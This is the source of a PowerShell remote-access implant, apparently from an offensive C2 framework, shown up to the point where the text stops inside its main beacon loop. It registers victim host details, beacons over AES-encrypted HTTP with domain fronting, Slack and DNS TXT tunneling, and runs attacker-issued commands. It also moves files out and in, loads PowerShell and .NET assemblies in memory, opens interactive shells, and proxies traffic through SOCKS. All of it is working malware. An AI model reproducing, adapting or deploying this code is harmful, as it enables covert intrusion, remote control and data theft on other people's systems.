[ScriptBlock] $defineFunctions = {
    if($PSVersionTable.PSVersion.Major -le 2){
        function ConvertTo-Json{
            param([Parameter(ValueFromPipeline=$True)]$item, $Depth, [switch]$Compress);
            add-type -assembly system.web.extensions;
            $ps_js=new-object system.web.script.serialization.javascriptSerializer;
            return $ps_js.Serialize($item);
        }

        function ConvertFrom-Json([object] $item){ 
            add-type -assembly system.web.extensions;
            $ps_js=new-object system.web.script.serialization.javascriptSerializer;
            return ,$ps_js.DeserializeObject($item);
        }
    }

    function generateKey($KeySeed){
        return  New-object System.Security.Cryptography.SHA256Managed | ForEach-Object {$_.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($KeySeed))};
    }
    function Send-SlackMessage {
        param([Parameter(Mandatory=$true, Position=0)][string]$token,[Parameter(Mandatory=$true, Position=1)][string]$channelID,[string]$text = "",[string]$header = "");
        $chars = $text.Length;
        If ($chars -gt 3000) {
            throw "Payload too long for slack API";
            }
        else {
            $chars = 0;
            $tmp = $text;
        }
        $attachment = Format-Table -InputObject $tmp | ConvertTo-Json -Compress;
        $body = @{"token" = $token; "channel" = $channelID; "attachments" = $attachment; "as_user" = $true; "text" = $header};
        try{
            $response = Invoke-RestMethod -Uri "https://slack.com/api/chat.postMessage" -Body $body -UserAgent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
        }catch{
            if($_.Exception.Message -eq "The remote server returned an error: (429) Too Many Requests."){
                sleep 3;
                return Send-SlackMessage $token $channelID -header $header;
            }else{
                throw $_.Exception;
            }
        }
        return $response;  
    }
    function Get-SlackReplies {
        param([Parameter(Mandatory=$true, Position=0)][string]$token, [Parameter(Mandatory=$true, Position=1)][string]$channelID, [Parameter(Mandatory=$true, Position=2)][string]$thread_ts);
        $body = @{"token" = $token; "channel" = $channelID; "thread_ts" = $thread_ts};
        try{
            Invoke-RestMethod -Uri "https://slack.com/api/channels.replies" -Body $body -UserAgent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
        }catch{
            if($_.Exception.Message -eq "The remote server returned an error: (429) Too Many Requests."){
                sleep 3;
                return Get-SlackReplies $token $channelID -header $header -thread_ts $thread_ts;
            }else{
                throw $_.Exception;
            }
            
        }
    }
    function Create-AesManagedObject($key, $IV) {
            $aesManaged = New-Object "System.Security.Cryptography.AesManaged";
            $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC;
            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
            $aesManaged.BlockSize = 128;
            $aesManaged.KeySize = 256;
            if ($IV) {
                if ($IV.getType().Name -eq "String") {
                    $aesManaged.IV = [System.Convert]::FromBase64String($IV);
                }
                else {
                    $aesManaged.IV = $IV;
                }
            }
            if ($key) {
                if ($key.getType().Name -eq "String") {
                    $aesManaged.Key = [System.Convert]::FromBase64String($key);
                }
                else {
                    $aesManaged.Key = $key;
                }
            }
            $aesManaged;
        }
    function Encrypt-StringB64($key, $unencryptedString) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString);
        $aesManaged = Create-AesManagedObject $key;
        $encryptor = $aesManaged.CreateEncryptor();
        $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
        [byte[]] $fullData = $aesManaged.IV + $encryptedData;
        [System.Convert]::ToBase64String($fullData);
    }
    function Decrypt-StringB64($key, $encryptedStringWithIV) {
            $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV);
            $IV = $bytes[0..15];
            $aesManaged = Create-AesManagedObject $key $IV;
            $decryptor = $aesManaged.CreateDecryptor();
            $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
            [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0);
        }
    function Encrypt-String($key, $unencryptedString) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString);
        return Encrypt-Bytes $key $bytes;
    }
    function Encrypt-Bytes($key, $bytes) {
        $aesManaged = Create-AesManagedObject $key;
        $encryptor = $aesManaged.CreateEncryptor();
        $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
        [byte[]] $fullData = $aesManaged.IV + $encryptedData;
        return $fullData;
    }
    function Decrypt-Bytes($key, $bytes) {
        $IV = $bytes[0..15];
        $aesManaged = Create-AesManagedObject $key $IV;
        $decryptor = $aesManaged.CreateDecryptor();
        $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
        return $unencryptedData
    }

    function POSTDNS($url,$body, $suffix){
        $EncData = Encrypt-StringB64 $config.key $body;
        $MagicData = $EncData.Replace("+", "-0").Replace("/", "-1").Replace("=", "-2");
        $i = 0;
        $overhead = $suffix.Length + 8 + $url.Length; 
        $canSend = 230 - $overhead;
        if($MagicData.Length -lt $canSend){
            $prefix = ("-1" + "." + $url.substring(0,1));
            $json = DNSComplete $prefix $MagicData $suffix;
            return ConvertFrom-Json $json;
        }
        else{
            $chunk = $MagicData.substring($i, $canSend);
            $id = DNSGETREQID $url.substring(0,1) $chunk $suffix;
            $i = $canSend;
            $overhead = $suffix.Length + 10 + $id.Length;
            $canSend = 230 - $overhead;
            $counter = 1;
            while($i -lt ($MagicData.length - $canSend)){
                $chunk = $MagicData.substring($i, $canSend);
                $success = $False;
                DNSChunk $id $counter $chunk $suffix;
                $i += $canSend;
                $counter += 1;
                Sleep -Milliseconds ([int]($config.refreshrate));
            }
            $chunk = $MagicData.substring($i, $MagicData.Length - $i);
        }
        $json = DNSComplete $id $chunk $suffix;
        return ConvertFrom-Json $json;
    }

    function DNSGETREQID($url, $data, $suffix){
        $Question = "N." + $url;
        for($i = 0;$i -lt $data.Length; $i += 63){
            $chunk = $data.substring($i, [Math]::Min($data.length - $i , 63));
            $Question += "." + $chunk;
        }
        $Question += "." + $suffix;
        $i = 0;
        while(($Response.Strings.length -eq 0) -and ($i -lt 5)){
            $Response = Resolve-DnsName -Name $Question -Type TXT -QuickTimeout -ErrorAction Ignore;
            $i += 1;
        }
        if($Response.Strings[0] -eq "-1"){
            throw "DNSError";
        }
        return $Response.Strings.split(".")[1];
    }

    function DNSChunk($id, $counter, $data, $suffix){
        $Question = "D." + $id + "." + $counter;
        for($i = 0;$i -lt $data.Length; $i += 63){
            $chunk = $data.substring($i, [Math]::Min($data.length - $i , 63));
            $Question += "." + $chunk;

        }
        $Question += "." + $suffix;
        $i = 0;
        while(($Response.Strings.length -eq 0) -and ($i -lt 5)){
            $Response = Resolve-DnsName -Name $Question -Type TXT -QuickTimeout -ErrorAction Ignore;
            $i += 1;
        }
        if($Response.Strings[0] -eq "-1"){
            throw "DNSError";
        }

    }

    function DNSComplete($id, $data, $suffix){
        $Question = "C." + $id;
        for($i = 0;$i -lt $data.Length; $i += 63){
            $chunk = $data.substring($i, [Math]::Min($data.length - $i , 63));
            $Question += "." + $chunk;
        }
        $Question += "." + $suffix;
        $i = 0;
        while(($Response.Strings.length -eq 0) -and ($i -lt 5)){
            $Response = Resolve-DnsName -Name $Question -Type TXT -QuickTimeout -ErrorAction Ignore;
            $i += 1;
        }
        if($Response.Strings[0] -eq "-1"){
            throw "DNSError";
        }
        $Split = (-join $Response.Strings).split(".");
        if ($Split[2] -ne "200"){
            throw $Split[2];
        }
        $json = Decrypt-StringB64 $config.key ($Split[3].replace("-0","+").replace("-1","/").replace("-2","="));
        return $json;
    }

    function POSTSlack($targetUrl, $body){
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null;
        $bodyEnc = Encrypt-StringB64 $config.key $body;
        $Body2 = @{
            url = $targetUrl;
            body = $bodyEnc;
        } | ConvertTo-Json -Compress  -Depth 3;
        $response = Send-SlackMessage -token $config.slacktoken -channelID $config.slackchannel -Header $Body2;
            if($targetUrl -ne "jobresult"){
                $thread_ts = $response.ts;
                sleep -Milliseconds 500;
                $response2 = Get-SlackReplies -token $config.slacktokenApp -channelID $config.slackchannel -thread_ts $thread_ts;
                if($response2.messages.length -lt 2){
                    Sleep 4;
                    $response2 = Get-SlackReplies -token $config.slacktokenApp -channelID $config.slackchannel -thread_ts $thread_ts;
                }
                if($response2.messages.length -lt 2){
                    throw "No response from handler";   
                }
                $result =  Decrypt-StringB64 $config.key $response2.messages[1].text ;
                if($result -eq "404"){
                    throw "404";
                }
            return ConvertFrom-Json $result;
        }
    }

    function POSTHTTP($httphost, $targetUrl, $body, $binary, $front){
        try{
            $urlEncrypted = Encrypt-String $config.key $targetUrl;
            if($body -ne $null){
                if($binary){
                    $bodyEnc = Encrypt-Bytes $config.key $body;    
                }else{
                    $bodyEnc = Encrypt-String $config.key $body;
                }
            }else{
                $bodyEnc = @()
            }
            $postrequest = [System.Net.WebRequest]::Create($httphost);
            $postrequest.Method = "POST";
            try{
                $proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                $proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                $postrequest.proxy = $proxy;
                }catch{}
            $postrequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
            $postrequest.Headers.Add("Authorization", [Convert]::ToBase64String($urlEncrypted));
            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
            if($front -ne $null){
                $postrequest.host = $front;
            }
            try
            {
                $requestStream = $postrequest.GetRequestStream();
                $requestStream.Write($bodyEnc,0,$bodyEnc.length);
            }
            finally
            {
                if ($null -ne $streamWriter) { $streamWriter.Dispose(); }
                if ($null -ne $requestStream) { $requestStream.Dispose(); }
            }
            try{
                $response = $postrequest.GetResponse();
                $outStream = $response.GetResponseStream();
                $memStream = New-Object System.IO.MemoryStream;
                $MyBuffer = [System.Byte[]]::CreateInstance([System.Byte],4096);
                $buff =  $memStream.ToArray();
                $bytesRead = 0;
                while (($bytesRead = $outStream.Read($MyBuffer, 0, 4096)) -gt 0)
                {
                    $memStream.Write($MyBuffer, 0, $bytesRead);
                }
                $buff =  $memStream.ToArray();
                if($buff.Length -gt 0){
                    $result = Decrypt-Bytes $config.key $buff;
                }else{
                    $result = @()
                }
            }finally{
                if ($null -ne $outStream) { $outStream.Dispose(); }
                if ($null -ne $memStream) { $memStream.Dispose(); }
            }
            if($binary -eq $true){
                return $result
            }
            else{
                Return ConvertFrom-Json ([System.Text.Encoding]::UTF8.GetString($result).Trim([char]0));
            }
            }catch{
        if($_.Exception.InnerException.Response.StatusCode -eq 404){
            throw "404";
        }else{
            throw $_;
            }
        }
    }

    function POSTREQ($targetUrl, $body){
        $handlers = $config.handlers.split(",");
        $ExcMessage = "";
        For ($i=0; $i -lt $handlers.Length + 1; $i++) {
            try{
                $handler = $handlers[$i].split("|");
                if($handler[0] -eq "HTTPAES256"){
                    Return POSTHTTP $handler[1] $targetUrl $body $false;
                }
                elseif($handler[0] -eq "SLACK"){
                    Return POSTSlack $targetUrl $body;
                }
                elseif($handler[0] -eq "HTTPAES256FRONT"){
                    Return POSTHTTP $handler[1] $targetUrl $body $false $handler[2];
                }
                elseif($handler[0] -eq "DNSAES256"){
                    Return POSTDNS $targetUrl $body $handler[1];
                }
            }catch{
                if($_.Exception.message -eq 404){
                    throw $_;
                }else{
                    $ExcMessage += "`r`n" + $_.Exception.message;
                }
            }
        }
        Throw $ExcMessage;   
    }

    function POSTBIN($pipe, $data, $maxSize){
        $handlers = $config.handlers.split(",");
        $ExcMessage = "";
        For ($i=0; $i -lt $handlers.Length + 1; $i++) {
            try{
                $handler = $handlers[$i].split("|");
                if($handler[0] -eq "HTTPAES256"){
                    $targetUrl = "bin/" + $pipe;
                    if ($maxSize -ne $null){
                        $targetUrl = $targetUrl + "?max=" + $maxSize;
                    }
                    Return POSTHTTP $handler[1] $targetUrl $data $true $null ;
                }
                elseif($handler[0] -eq "SLACK"){
                    $Body = @{
                        pipe_id = $pipe_id;
                        maxSize = $maxSize;
                    }
                    if($data -ne $null){
                        $body.in = [Convert]::ToBase64String($Data);
                    }
                    $Json = $body | ConvertTo-Json;
                    Return [System.Convert]::FromBase64String((POSTSlack "io"  $Json).out);
                }
                elseif($handler[0] -eq "HTTPAES256FRONT"){
                    $targetUrl = "bin/" + $pipe;
                    if ($maxSize -ne $null){
                        $targetUrl = $targetUrl + "?max=" + $maxSize;
                    }
                    Return POSTHTTP $handler[1] $targetUrl $data $true $handler[2] ;
                }
                elseif($handler[0] -eq "DNSAES256"){
                   $Body = @{
                        pipe_id = $pipe_id;
                        maxSize = $maxSize;
                    }
                    if($data -ne $null){
                        $body.in = [Convert]::ToBase64String($Data);
                    }
                    $Json = $body | ConvertTo-Json;
                    Return [System.Convert]::FromBase64String((POSTDNS "io"  $Json $handler[1]).out);
                }
            }catch{
                if($_.Exception.message -eq 404){
                    throw $_;
                }else{
                    $ExcMessage += "`r`n" + $_.Exception.message;
                }
            }
        }
        Throw $ExcMessage;   
    }

    function sendJobResult($job_id, $result, $hasError){
        if ($cmdResult.cmdOutput.length -le [int]$config.buffersize){
                $targetUrl = "jobresult";
                $JsonBody = @{
                    error = $hasError;
                    jobId = $job._id;
                    moreData = 0;
                    result = $result;
                } | ConvertTo-Json ;
                POSTREQ $targetUrl  $JsonBody | Out-Null;
            }else{
                for($i=0; $i -lt $result.length; $i=$i+[int]($config.buffersize)){
                    if($i+[int]($config.buffersize) -ge $cmdResult.cmdOutput.length){
                            $outputPiece = $result.substring($i,$result.length -$i);
                            $moreData = $false;
                    }else{
                            $outputPiece = $result.substring($i,[int]($config.buffersize));
                            $moreData = $true;
                            Sleep -Milliseconds ([int]($config.refreshrate));
                    }
                    $targetUrl = "jobresult";
                    $Body = @{
                        error = $hasError;
                        jobId = $job._id;
                        moreData = $moreData;
                        result = $outputPiece;
                    } | ConvertTo-Json;
                    POSTREQ $targetUrl $Body;
                }
            }
    };
    function pipeReadBytes($pipe_id, $bytesWanted, $maxTries = 10){
        [byte[]]$Data = @();
        $bffLth = [int]($config.buffersize);
        $refR = [int]($config.refreshrate);
        $tries = 0;
        while($Data.Length -lt $bytesWanted -and $tries -lt $maxTries ){
            $NewData = POSTBIN $pipe_id $null ([Math]::Min($bytesWanted - $Data.Length, $bffLth));
            if($NewData.Length -gt 0){
                $tries = 0;
                $Data += $NewData;
            }else{
                $tries += 1;
            }
            Start-Sleep -Milliseconds $refR;
        }
        Return $Data; 
    }
    function Pipe2Stream($pipe_id, $Stream, $bytesWanted){
        $bffLth = [int]($config.buffersize);
        $refR = [int]($config.refreshrate);
        $i = 0;
        while($i -lt $bytesWanted){
            $buff = POSTBIN $pipe_id $null ([Math]::Min($bytesWanted - $i, $bffLth));
            $i += $buff.length;
            $Stream.write($buff,0,$buff.length);
            Start-Sleep -Milliseconds $refR;
        }
    }
    function Stream2Pipe($pipe_id, $Stream){
        $bffLth = [int]($config.buffersize);
        $refR = [int]($config.refreshrate);
        [Byte[]]$BUFFER = New-Object System.Byte[] $bffLth;
        while (($BYTESREAD = $Stream.Read($BUFFER, 0, $BUFFER.Length)) -gt 0){
            pipeWrite $pipe_id $BUFFER[0..($BYTESREAD-1)];
            Start-Sleep -Milliseconds $refR;
        }
    }
    function pipeRead($pipe_id){
        [byte[]]$Data = @();
        $bffLth = [int]($config.buffersize);
        $data2 = POSTBIN $pipe_id $null $bffLth;
        Return $data2;
    }

    function pipeWrite($pipe_id, $Data){
        $i = 0;
        $bffLth = [int]($config.buffersize);
        $refR = [int]($config.refreshrate);
        While($i -lt $Data.Length){
            $c = [Math]::Min($Data.Length - $i, $bffLth);
            POSTBIN $pipe_id ($Data[$i..($i+$c)]) 0; 
            $i += $c;
            Start-Sleep -Milliseconds $refR;
        }
    }
    function pipeReadWrite($pipe_id, $Data){
        $bffLth = [int]($config.buffersize);
        $refR = [int]($config.refreshrate);
        [byte[]]$rData = @();
        $i = 0;
        While($i -lt $Data.Length){
            $c = [Math]::Min($Data.Length - $i, $bffLth);
            $rData += POSTBIN $pipe_id ($Data[$i..($i+$c)]) $bffLth;
            $i += $c;
            Start-Sleep -Milliseconds $refR;
        }
        return $rData;
    }
};
function registerImplant {
    $targetUrl = "register";
    try{
        $ip = (Test-Connection -ComputerName (hostname) -Count 1  | Select -ExpandProperty IPV4Address).IPAddressToString ;
    }catch{$ip = "127.0.0.1";}
    $Body = "{`"implantType`":`"PowerShell`",`"localIp`":`""+$ip+"`",`"hostname`":`""+$env:COMPUTERNAME+"`",`"username`":`""+$env:UserName+"`",`"handler`":`"Multi`",`"connectionString`":`""+$config.handlers+"`",`"supportedPayloads`":[`"command`",`"exit`",`"upload`",`"download`",`"configure`",`"posh_in_mem`",`"reflected_assembly`",`"cd`",`"interactive`",`"socks`"],`"os`":`"windows`"}";
    while($Result._id -eq $null){
        try{
            $Result = POSTREQ $targetUrl $Body;
            Sleep (Get-Random -Minimum ([float]$config.sleep * 0.7) -Maximum ([float]$config.sleep * 1.3));
        }catch{Sleep 3}
    }
    return $Result._id;
}
function heartbeat {
    param($id);
    $Body = "{`"id`":`""+$id+"`"}";
    $targetUrl = "heartbeat";
    $Jobs = POSTREQ $targetUrl $Body;
    return $Jobs;
}
[ScriptBlock] $executeJob = {
    param($job, $config, $defineFunctions);
    . ([ScriptBlock]::Create($defineFunctions));
    [ScriptBlock] $exeSB = {
        param($execcmd, $shell)
        $hasError = $false;
        try{
            if($shell -eq "powershell"){
                $stdout="";
                $rawResult = Invoke-Expression $execcmd | Out-String;
                ForEach ($line in $($rawResult -split "`r`n")){
                    $stdout+=$line.TrimEnd() + "`r`n";
                }
            }
            else{
                $cmdOutput = '';
                $allOutput  = cmd /c $execcmd 2>&1;
                $stderr = $allOutput | ?{ $_ -is [System.Management.Automation.ErrorRecord] };
                $stdout = $allOutput | ?{ $_ -isnot [System.Management.Automation.ErrorRecord] }  | Out-String;
                $stderr = $stderr.Exception.Message | Out-String;
            }
        }catch{$stderr = $_.Exception.message;}
        $cmdOutput = $stdout + $stderr;
        if($stderr){
            $hasError = $true;
        }
        return @{cmdOutput = $cmdOutput; hasError = $hasError};
      };
    try{
        $hasError = $false;
        if($job.("payload").type -eq "command"){
                if($job.("payload").("options").path -ne $null){
                        Set-Location -Path $job.("payload").("options").path -ErrorAction Stop;
                }
                $cmdResult = invoke-command -scriptBlock $exeSB -ArgumentList $job.("payload").("options").cmd,$config.shell -ErrorAction Stop;
                sendJobResult $job._id $cmdResult.cmdOutput $cmdResult.hasError;
            }
        elseif($job.("payload").type -eq "cd"){
                if($job.("payload").("options").path -ne $null){
                        Set-Location -Path $job.("payload").("options").path -ErrorAction Stop;
                }
                if($job.("payload").("options").dir -ne $null){
                        Set-Location -Path $job.("payload").("options").dir -ErrorAction Stop;
                }
                sendJobResult $job._id (Get-Location).Path $false;
        }
        elseif($job.("payload").type -eq "upload"){
                if($job.("payload").("options").path -ne $null){
                        if(-not [System.IO.Path]::IsPathRooted($job.("payload").("options").file)){
                            $job.("payload").("options").file = Join-Path -ChildPath $job.("payload").("options").file -Path $job.("payload").("options").path;
                        }
                        Set-Location -Path $job.("payload").("options").path -ErrorAction Stop;
                }
                $FileStreamReader = [System.IO.File]::OpenRead($job.("payload").("options").file);
                Stream2Pipe $job.("payload").("options").pipe_id $FileStreamReader;
                sendJobResult $job._id $FileStreamReader.name $false; 
            }
        elseif($job.("payload").type -eq "download"){
                if($job.("payload").("options").path -ne $null){
                        if(-not [System.IO.Path]::IsPathRooted($job.("payload").("options").file)){
                            $job.("payload").("options").file = Join-Path -ChildPath $job.("payload").("options").file -Path $job.("payload").("options").path;
                        }
                        if( (Get-Item $job.("payload").("options").file ) -is [System.IO.DirectoryInfo]){
                            $job.("payload").("options").file = Join-Path -ChildPath $job.("payload").("options").filename -Path $job.("payload").("options").file;
                        }
                        Set-Location -Path $job.("payload").("options").path -ErrorAction Stop;
                }
                
                $FileStreamWriter = New-Object System.IO.FileStream($job.("payload").("options").file, [System.IO.FileMode]::Create);
                Pipe2Stream $job.("payload").("options").pipe_id $FileStreamWriter $job.("payload").("options").length;
                sendJobResult $job._id $FileStreamWriter.name $false;            
            }
        elseif($job.("payload").type -eq "posh_in_mem"){
                if($job.("payload").("options").pipe_id){
                    
                    $bytes = pipeReadBytes $job.("payload").("options").pipe_id $job.("payload").("options").length;
                    $script = [System.Text.Encoding]::ASCII.GetString($bytes); 
                }else{$script = "";}
                $script += "`r`n" + $job.("payload").("options").command;
                $result="";
                $rawResult = Invoke-Expression $script | Out-String;
                ForEach ($line in $($rawResult -split "`r`n")){
                    $result+=$line.TrimEnd() + "`r`n";
                }
                sendJobResult $job._id $result $false;           
            }
        elseif($job.("payload").type -eq "reflected_assembly"){
                if($job.("payload").("options").path -ne $null){
                        Set-Location -Path $job.("payload").("options").path -ErrorAction Stop;
                }
                $Bytes = pipeReadBytes $job.("payload").("options").pipe_id $job.("payload").("options").length; 
                if($job.("payload").("options").arguments -ne ""){
                    $arguments = $job.("payload").("options").arguments.split(",");
                }else{$arguments = @();}
                $types = [Type[]]::new($arguments.Length);
                $arguments2 = [Object[]]::new($arguments.Length);
                for($i = 0; $i -lt $arguments.Length; $i++){
                    if($arguments[$i].Length -ge 7 -and $arguments[$i].substring(0, 6).ToLower() -eq "[bool]"){
                        [Boolean]$arguments2[$i]=[System.Convert]::ToBoolean($arguments[$i].split("]")[1]);
                    }elseif($arguments[$i].Length -ge 6 -and $arguments[$i].substring(0, 5).ToLower() -eq "[int]"){
                        [int]$arguments2[$i]=[System.Convert]::ToInt32($arguments[$i].split("]")[1]);
                    }else{
                        $arguments2[$i] = $arguments[$i];
                    }
                    $types[$i]=($arguments2[$i].GetType());
                }
                $result = [System.Reflection.Assembly]::Load($Bytes).GetType($job.("payload").("options").class).GetMethod($job.("payload").("options").method,$types).Invoke(0, $arguments2);
                sendJobResult $job._id $result $false;             
        }
        elseif($job.("payload").type -eq "interactive"){
                if($job.("payload").("options").path -ne $null){
                        Set-Location -Path $job.("payload").("options").path -ErrorAction Stop;
                }
                $pipe_id = $job.("payload").("options").pipe_id;
                $refreshrate = [int]($config.refreshrate);
                $buffLgth = [int]($config.buffersize);
                $PrStInfo = New-Object System.Diagnostics.ProcessStartInfo;
                $PrStInfo.FileName = $job.("payload").("options").filename;
                $PrStInfo.UseShellExecute = $False;
                $PrStInfo.RedirectStandardInput = $True;
                $PrStInfo.RedirectStandardOutput = $True;
                $PrStInfo.RedirectStandardError = $True;
                $Process = [System.Diagnostics.Process]::Start($PrStInfo);
                $Process.Start() | Out-Null;
                $OutBuff = New-Object System.Byte[] $buffLgth;
                $OutReadOp = $Process.StandardOutput.BaseStream.BeginRead($OutBuff, 0, $buffLgth, $null, $null);
                $ErrBuff = New-Object System.Byte[] $buffLgth;
                $ErrReadOp = $Process.StandardError.BaseStream.BeginRead($ErrBuff, 0, $buffLgth, $null, $null);
                $encoding = New-Object System.Text.AsciiEncoding;
                while($Process.HasExited -eq $false)
                  {
                    try{
                        [byte[]]$Data = @();
                        if($OutReadOp.IsCompleted)
                        {
                            $StdOutBytesRead = $Process.StandardOutput.BaseStream.EndRead($OutReadOp);
                            if($StdOutBytesRead -ne 0){
                                $Data += $OutBuff[0..([int]$StdOutBytesRead-1)];
                                $OutReadOp = $Process.StandardOutput.BaseStream.BeginRead($OutBuff, 0, $buffLgth, $null, $null);
                                }
                        }
                        if($ErrReadOp.IsCompleted)
                        {
                            $StdErrBytesRead = $Process.StandardError.BaseStream.EndRead($ErrReadOp);
                            if($StdErrBytesRead -ne 0){
                                $Data += $ErrBuff[0..([int]$StdErrBytesRead-1)];
                                $ErrReadOp = $Process.StandardError.BaseStream.BeginRead($ErrBuff, 0, $buffLgth, $null, $null);
                            }
                        }
                    }catch{}
                    if(($Data -ne $null) -and ($Data.Length -ne 0)){
                        $data2 = pipeReadWrite $pipe_id $Data;
                    }else{
                        $data2 = pipeRead $pipe_id;
                    }
                    if($data2.Length -gt 0){
                        $Process.StandardInput.Write([System.Text.Encoding]::ASCII.GetString($data2));
                    }
                    Start-Sleep -Milliseconds $refreshrate;
                  }
                sendJobResult $job._id "Process Exited" $false;               
        }
        elseif($job.("payload").type -eq "socks" -or $job.("payload").type -eq "tcp_fwd"){
            $refreshrate = [int]($config.refreshrate);
            $buffLgth = [int]($config.buffersize);
            $pipe_id = $job.("payload").("options").pipe_id;
            function Get-IpAddress{
                    param($ip);
                    IF ($ip -as [ipaddress]){
                        return $ip;
                    }else{
                        $ip2 = [System.Net.Dns]::GetHostAddresses($ip)[0].IPAddressToString;
                    }
                    return $ip2;
                }
            if($job.("payload").type -eq "socks"){
                $buffer = pipeReadBytes $pipe_id 2;
                $socksVer=$buffer[0];
                if ($socksVer -eq 5){
                    $buffer = pipeReadBytes $pipe_id $buffer[1];
                    for ($i=0; $i -le $buffer.Length; $i++) {
                        if ($buffer[$i] -eq 0) {break}
                    }
                    $buffer2 = New-Object System.Byte[] 2;
                    $buffer2[0] = 5;
                    if ($buffer[$i] -ne 0){
                        $buffer2[1] = 255;
                        pipeWrite $pipe_id $buffer2;
                    }else{
                        $buffer2[1]=0;
                        pipeWrite $pipe_id $buffer2;
                    }
                    $buffer = pipeReadBytes $pipe_id 4;
                    $sockscmd = $buffer[1];
                    $atyp = $buffer[3];
                    if($sockscmd -ne 1){
                        $buffer2[0] = 5;
                        $buffer2[1] = 7;
                        pipeWrite $pipe_id $buffer2;
                        throw "Not a connect";
                    }
                    if($atyp -eq 1){
                        $ipv4 = pipeReadBytes $pipe_id 4;
                        $ipAddress = New-Object System.Net.IPAddress(,$ipv4);
                        $hostName = $ipAddress.ToString();
                    }elseif($atyp -eq 3){
                        $hostSize = pipeReadBytes $pipe_id 1;
                        $hostBuff = pipeReadBytes $pipe_id $hostSize[0];
                        $hostName = [System.Text.Encoding]::ASCII.GetString($hostBuff);
                    }
                    else{
                        $buffer2[1] = 8;
                        pipeWrite $pipe_id $buffer2;
                        throw "Not a valid destination address";
                    }
                    $buffer = pipeReadBytes $pipe_id 2;
                    $destPort = $buffer[0]*256 + $buffer[1];
                    $destHost = Get-IpAddress($hostName);
                    if($destHost -eq $null){
                        $buffer2[1]=4;
                        pipeWrite $pipe_id $buffer2;
                        throw "Cant resolve destination address";
                    }
                    $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort);
                    if($tmpServ.Connected){
                        $buffer2 = New-Object System.Byte[] 4;
                        $buffer2[0]=5;
                        $buffer2[1]=0;
                        $buffer2[2]=0;
                        $buffer2[3]=$atyp;
                        if($atyp -eq 1){
                            $buffer2 += $ipv4;
                        }elseif($atyp -eq 3){
                            $buffer2 += $hostSize;
                            $buffer2 += $hostBuff;
                        }
                        $buffer2 += $buffer;
                        pipeWrite $pipe_id $buffer2;
                    }
                    else{
                        $buffer2[1]=4;
                        pipeWrite $pipe_id $buffer2;
                        throw "Cant connect to host";
                    }
                }elseif($socksVer -eq 4){
                    $sockscmd = $buffer[1];
                    if($sockscmd -ne 1){
                        $buffer2 = New-Object System.Byte[] 2;
                        $buffer2[0] = 0;
                        $buffer2[1] = 91;
                        pipeWrite $pipe_id $buffer2;
                    }
                    $bufferPorts = pipeReadBytes $pipe_id 2;
                    $destPort = $bufferPorts[0]*256 + $bufferPorts[1];
                    $ipv4 = pipeReadBytes $pipe_id 4;
                    $destHost = New-Object System.Net.IPAddress(,$ipv4);
                    $buffer[0]=1;
                    while ($buffer[0] -ne 0){
                        $buffer = pipeReadBytes $pipe_id 1;
                    }
                    $tmpServ = New-Object System.Net.Sockets.TcpClient($destHost, $destPort);
                    $buffer2 = New-Object System.Byte[] 2;
                    $buffer2[0]=0;
                    $buffer2 += $bufferPorts;
                    $buffer2 += $ipv4;
                    if($tmpServ.Connected){
                        $buffer2[1]=90;
                        pipeWrite $pipe_id $buffer2;
                    }else{
                        $buffer2[1]=91;
                        pipeWrite $pipe_id $buffer2;
                        throw "Cant connect to host";
                    }
                }else{
                    throw "Unknown socks version";
                }
            }else{
                $tmpServ = New-Object System.Net.Sockets.TcpClient($job.("payload").("options").host, [int]($job.("payload").("options").port));
                if(-not $tmpServ.Connected){
                    throw "Cant connect to host";
                }
            }
            $srvStream = $tmpServ.GetStream();
            $OutBuff = New-Object System.Byte[] $buffLgth;
            $OutReadOp = $srvStream.BeginRead($OutBuff, 0, $buffLgth, $null, $null);
            while($tmpServ.Connected){
                [byte[]]$Data = @();
                if($OutReadOp.IsCompleted)
                {
                    $StdOutBytesRead = $srvStream.EndRead($OutReadOp);
                    if($StdOutBytesRead -ne 0){
                        $Data += $OutBuff[0..([int]$StdOutBytesRead-1)];
                        $OutReadOp = $srvStream.BeginRead($OutBuff, 0, $buffLgth, $null, $null);
                    }
                }
                if(($Data -ne $null) -and ($Data.Length -ne 0)){
                    $data2 = pipeReadWrite $pipe_id $Data;
                }else{
                    $data2 = pipeRead $pipe_id;
                }
                if($data2.Length -gt 0){
                   $srvStream.Write($data2,0,$data2.Length);
                }
                Start-Sleep -Milliseconds $refreshrate;  
            }
            sendJobResult $job._id "Tcp Connection Closed" $false;              
        }
        else{
            Throw "Payload type not supported: " + $job.("payload").type;
        }
        }catch{
            if($config.debug -eq "true"){
              $exc = $_ | Out-String;
              sendJobResult $job._id $exc $true;
            }else{
              sendJobResult $job._id $_.Exception.Message $true;
            }

        }Finally{
            if($FileStreamReader){$FileStreamReader.Close();}
            if($FileStreamWriter){$FileStreamWriter.Close();}
        }
};
. ($defineFunctions);

function runImplant{
    param($config)
    $config.key = generateKey $config.password
    $config.id = registerImplant;
    while($true){
        Sleep (Get-Random -Minimum ([float]$config.sleep * 0.7) -Maximum ([float]$config.sleep * 1.3));
        try{
            $Jobs = heartbeat($config.id);
        }catch{        
            $Jobs = $null;
            if($_.Exception.message -eq "404"){
                $config.id = registerImplant;
            }
        }
        For ($i=0; $i -lt $Jobs.data.Length; $i++) {
